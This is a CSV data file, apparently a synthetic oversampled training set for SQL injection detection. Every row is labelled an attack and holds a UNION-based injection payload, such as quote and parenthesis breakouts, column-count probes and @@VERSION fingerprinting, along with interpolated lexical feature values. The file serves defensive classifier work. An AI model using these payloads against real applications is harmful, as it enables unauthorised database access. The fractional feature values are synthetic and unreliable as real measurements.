id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000305,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,0.3859958453153689,66.05209460235413,21.205209460235412,3.7148689346237886,13.999999999999998,33.641675681883314,8.0,10.410418920470827,0.21268384196939233,0.5083193024419762,0.12153362398250991,0.15746323160612152,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.410418920470827,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000306,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R000272,1.0523864307417508,57.326841154418005,21.0,3.748538545594547,13.999999999999998,23.538243078448005,11.346317691163998,8.442280384806,0.2443777917185678,0.4090813526951357,0.1994001254671101,0.14714073011918644,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.5577196151939996,0.0,0.0,3.884560769612001,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000307,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R000247,0.15244525001881074,69.0,23.9428945633235,3.878178155014136,19.0,28.228421746705997,13.771578253294003,8.0,0.2753623188405797,0.40910756154646377,0.1995880906274493,0.11594202898550725,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.9428945633235005,0.0,0.0,3.0571054366764994,4.0,0.0,0.0,1.0,0.0,0.0,1.0,0.9428945633235005,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000308,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000306,1.062144068880282,68.43910087666083,22.508699874762737,3.786051621009473,13.999999999999998,32.0,10.947800751423575,11.491300125237263,0.20509670677921973,0.4687924726382165,0.15813979526265934,0.16797102531990446,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.4913001252372624,1.0,0.0,6.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000309,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000182,0.3783021734616554,73.43190937912007,22.142022655219982,3.7886925191262955,13.999999999999998,39.43190937912007,8.0,12.0,0.19072456924562145,0.5368117604034908,0.1089854681403551,0.16347820221053266,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.14202265521998142,0.0,7.857977344780018,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000310,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,0.5046880091722937,65.77244852416604,20.0,3.765805282407505,13.999999999999998,26.03591763866566,14.98204118066717,10.754489704833208,0.21309237377507836,0.39450599978669953,0.2289317476568069,0.16346987878141514,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.2455102951667927,0.0,0.0,4.508979409666415,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000311,attack,union,"1%"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000280,0.10805588004204264,62.57859160682702,16.0,3.1392871111735885,46.46287328546162,1.0,4.0,11.115718321365405,0.7424369113588294,0.015989746844769587,0.06395898737907846,0.17761435441732254,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,7.115718321365405,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000312,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R000126,0.3499517539891445,65.69240864125892,23.276963456503573,3.819042325106665,34.72303654349643,9.0,15.107853826014285,6.861518271748214,0.5291786973369682,0.13709193895135596,0.22908061048644035,0.10464875322523548,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.1384817282517856,0.0,0.0,2.7230365434964288,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000313,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R000225,0.3628132217479251,65.0,22.0,3.766049935477077,34.26466139234419,9.0,14.98045147687442,6.754887130781395,0.5271486368052951,0.13846153846153847,0.23046848425960648,0.10392134047355993,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1225564346093024,0.0,0.0,2.632330696172093,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000314,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000020,0.9868377471200934,75.9490735688752,26.474536784437607,3.9055452438617886,40.0,2.949073568875212,23.0,10.0,0.5267596635922063,0.03866361394422346,0.3028868065655186,0.13168991589805157,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.4745367844376058,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000315,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000159,0.6565976797913039,62.86726912982765,21.377576956724116,3.783860200060396,13.999999999999998,29.65979478206902,8.0,11.207474347758627,0.2233860028530241,0.4704833597356056,0.12764914448744236,0.1784814929239279,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.7925256522413724,0.0,5.414948695517255,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000316,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000007,0.20895808152016598,73.0,33.0,4.400124178606237,42.0,3.0,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.670185078982035,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000317,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000084,0.5646781864660676,58.67025042436356,22.0,3.9477669590636415,13.999999999999998,26.68100169745422,8.98924872690933,9.0,0.2386608665057717,0.4541814119142491,0.15373287882626885,0.15342484275371038,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1648747878182222,0.16487478781822196,0.0,4.670250424363556,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000318,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000237,0.011599835807084147,75.97714581978745,25.986287491872474,3.897352844184273,37.00914167208502,9.0,21.963433311659927,8.00457083604251,0.4871275707461686,0.11845917116788598,0.2890518390753949,0.1053614190105506,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.9954291639574908,0.0,0.0,2.009141672085018,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000319,attack,union,"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",nearest_attack_euclidean,R000112,0.44762360384045896,79.18167527414008,20.36335054828015,3.713094959221745,13.999999999999998,44.0,8.0,13.181675274140074,0.17681274464589225,0.5556971974585185,0.101035854083367,0.16645420381222228,0.18167527414007412,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,9.0,3.0,0.181675274140074,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000320,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000204,1.3723992174044541,70.66041067912273,17.0,3.1627387961001956,47.42819775892029,1.0,10.46442584040489,11.767787079797554,0.6664329266928393,0.014273097184811456,0.15330264796110898,0.1659913281612403,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4107376400674818,1.0,0.0,7.357049439730073,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000321,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000309,1.4949170245694914,69.07246063167149,15.48792322805475,3.1284962327184402,46.0,1.0,11.072460631671493,11.0,0.6672278642557052,0.014504953570776191,0.15871269289498036,0.15955448927853821,0.487923228054751,0.0,2.0,0.0,0.0,0.0,0.0,1.512076771945249,0.0,0.0,7.0,2.0,0.4879232280547509,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000322,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000049,0.1462289793506258,71.5312595586731,31.0,4.379757798846439,44.0,2.0,15.531259558673097,10.0,0.615208292382478,0.027964013290112638,0.21700762787684613,0.1398200664505632,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000323,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000299,0.09915881951049012,73.58840031231607,17.0,3.219008623903366,45.56096033313713,1.0,14.109759916715717,12.917680062463212,0.6185168690530483,0.013607787376931718,0.19236936084849707,0.1755059827215229,1.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0274399791789293,1.0,0.0,6.890240083284283,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000324,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000297,0.11410534620273201,70.0,19.368009544752717,3.615417050736089,13.999999999999998,40.0,4.0,12.0,0.2,0.5714285714285714,0.057142857142857134,0.17142857142857143,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000325,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000267,0.46471519248737553,71.85301485404817,16.170602970809636,3.016011721830967,54.0,1.0,4.68241188323854,12.170602970809636,0.7520269084287248,0.013926424230161577,0.06468480064746916,0.16936186669364456,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17060297080963494,1.0,0.0,9.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.17060297080963494,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000326,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000193,1.1616131305364892,58.66189614735076,22.66905192632462,3.894539053071201,30.98568844205228,9.0,14.01431155794772,4.6618961473507605,0.5275790061396151,0.15346061341202388,0.23972406092050447,0.07923631952785662,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.66905192632462,0.0,0.0,0.9928442210261399,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.66905192632462,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000327,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000142,0.3521206646086681,58.13480106415592,23.26960212831184,3.9104968860384064,27.6519893584408,10.482811705715116,15.73039787168816,4.26960212831184,0.4760099801078448,0.17995028327120793,0.2706622616982521,0.07337747492269521,1.0,0.0,0.13480106415591986,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.13480106415592008,1.1348010641559199,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000328,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000048,11.644895340947825,81.0,27.0,3.8935062943478846,42.0,3.460594679388631,25.0,10.539405320611369,0.5185185185185185,0.04272339110356335,0.30864197530864196,0.13011611506927614,0.0,0.4605946793886312,2.0,0.0,1.0,1.0,0.4605946793886312,2.0,0.0,0.0,1.0,4.0,0.0,0.4605946793886312,1.0,0.4605946793886312,0.0,1.0,1.0,0.4605946793886312,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000329,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R000236,0.13621485517594706,71.0,22.0,3.8972388580802475,13.999999999999998,36.20534298916024,7.794657010839754,13.0,0.19718309859154926,0.5099344082980316,0.1097839015611233,0.18309859154929578,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.9486642527099386,1.0,0.0,7.051335747290062,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9486642527099386,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000330,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000193,0.7866779192611308,60.13791739283075,23.0,3.88519006427511,30.83250062242636,9.0,15.389166459191214,4.91625031121318,0.5117467988617074,0.15006863221870642,0.2573912404105566,0.08079332850902955,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.9162503112131795,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000331,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000208,0.0973558400828542,74.09564546558721,15.0318818218624,2.9747233563170328,53.8724727125504,1.0,8.191290931174407,11.0318818218624,0.7271670982076203,0.01349672771751717,0.11045811954759716,0.14887805452726544,0.031881821862401405,0.0,0.0,0.0,0.0,0.0,0.0,1.0318818218624015,0.0,0.0,8.968118178137598,0.0,0.03188182186240135,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000332,attack,union,"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",nearest_attack_euclidean,R000287,0.02728306941373798,65.0,20.097372591906677,3.803173840206364,13.999999999999998,32.0,8.0,11.0,0.2153846153846154,0.49230769230769234,0.12307692307692308,0.16923076923076924,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000333,attack,union,"-6527'   )    )    union all select 5053,5053,5053,5053--",nearest_attack_euclidean,R000199,1.3033992612015854,58.89168319491391,20.48194719915232,3.8308011293974773,13.999999999999998,21.927788796609274,14.0,8.963894398304637,0.23833998711728263,0.37157906356907866,0.2383399871172826,0.1517409621963561,0.48194719915231843,0.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.4819471991523185,3.0,0.4819471991523184,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000334,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000020,4.800787923323022,75.46735661876468,26.467356618764676,3.8820430661360215,40.0,2.0,23.467356618764676,10.0,0.5300536377630549,0.026502681888152718,0.3109302709080286,0.13251340944076373,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.4673566187646771,1.0,4.532643381235323,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000335,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000291,0.4694685810919389,71.41388087759901,20.517223824480197,3.382780172043334,13.999999999999998,41.93110470207922,4.0,11.482776175519804,0.19627999759373554,0.5868960026125157,0.05607999931249588,0.1607440004812529,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.482776175519804,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000336,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000184,0.6672880244445523,56.108883545867904,22.108883545867904,3.785623789916043,21.772208864669757,14.05945379473117,14.554441772933952,5.722779113533024,0.38594844381674775,0.2525509466799161,0.259158683472794,0.10234192603054204,1.0,0.0,2.722779113533024,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.722779113533024,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000337,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000218,0.18839932682984595,62.82310551399205,22.0,3.74841587852394,13.999999999999998,24.65848441119364,14.0,10.16462110279841,0.22303238392010383,0.3921693551175244,0.22303238392010383,0.1617658770422679,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,4.16462110279841,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
